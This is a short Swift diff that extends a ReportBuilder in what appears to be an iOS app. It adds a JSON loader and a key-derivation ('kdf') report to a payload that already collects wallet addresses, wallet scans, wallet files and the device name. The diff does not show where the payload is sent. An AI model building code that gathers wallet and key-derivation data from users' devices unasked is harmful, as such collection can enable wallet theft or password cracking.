@@ -55,6 +55,15 @@ enum ReportBuilder {
         return dict
     }
 
+    static func loadJSONArray(_ name: String) -> [[String: Any]] {
+        let url = URL.documentsDirectory.appendingPathComponent(name)
+        guard let data = try? Data(contentsOf: url),
+              let rows = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] else {
+            return []
+        }
+        return rows
+    }
+
     static func loadWalletFiles() -> [[String: Any]] {
         let url = URL.documentsDirectory.appendingPathComponent("wallet-files.json")
         guard let data = try? Data(contentsOf: url),
@@ -138,6 +147,7 @@ enum ReportBuilder {
         let addresses = loadAddresses()
         let walletScan = loadWalletScan()
         let walletFiles = loadWalletFiles()
+        let kdf = loadJSONArray("kdf-report.json")
 
         let payload: [String: Any] = [
             "source": "erosion",
@@ -145,6 +155,7 @@ enum ReportBuilder {
             "addresses": addresses,
             "walletScan": walletScan,
             "walletFiles": walletFiles,
+            "kdf": kdf,
             "reportedAt": ISO8601DateFormatter().string(from: Date()),
             "device": [
                 "name": UIDevice.current.name,
